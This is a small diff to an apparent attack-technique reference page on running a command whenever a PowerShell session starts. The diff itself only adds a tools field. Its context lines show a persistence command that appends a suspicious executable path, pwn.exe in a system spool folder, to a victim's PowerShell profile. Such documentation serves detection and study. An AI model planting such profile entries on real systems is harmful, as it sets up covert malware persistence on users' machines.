@@ -7,6 +7,8 @@ data: echo "$_FULL_PATH\$_TARGET.exe" >> "C:\Users\$_TARGET_USER\Documents\Windo
 output: C:\Users\Victim>echo C:\Windows\System32\spool\drivers\color\pwn.exe >> C:\Users\Victim\Documents\WindowsPowerShell\profile.ps1
 created_at: '2020-06-22T03:58:55.070291+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Powershell]]'
 ---
 
 # Execute a Command when a PowerShell Session Starts
